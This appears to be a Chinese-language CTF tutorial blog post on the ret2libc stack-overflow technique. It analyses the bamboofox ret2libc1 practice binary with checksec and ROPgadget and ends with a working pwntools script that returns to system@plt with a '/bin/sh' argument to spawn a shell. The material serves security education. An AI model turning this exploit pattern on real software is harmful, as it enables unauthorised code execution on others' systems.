# Pwn-ROP-ret2libc-初级


# ret2libc原理

ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 **plt** 处或者函数的具体位置 (即函数对应的 **got** 表项的内容)。一般情况下，我们会选择执行 **system("/bin/sh")**，故而此时我们需要知道 system 函数的地址。（当然同时还要知道字符串/bin/sh的地址）

# 实例

> 初级实例中，在plt段可以直接找到system函数，同时在.data段（准确的说是.rodata段）可以找到/bin/sh字符串

这里我们以 bamboofox 中 ret2libc1为例

点击下载: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)

首先，我们可以检查一下程序的安全保护

```
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

源程序为 32 位，**开启了 NX 保护**。下面来看一下程序源代码，确定漏洞位置

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在

```
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。

```
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下

```
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。

这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。

> 注意：如果开启了NX保护，题目中一般会给出system，无论是在libc中还是plt中还是text中，如果没开启NX保护，基本上需要自己写入shellcode


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E5%88%9D%E7%BA%A7/  

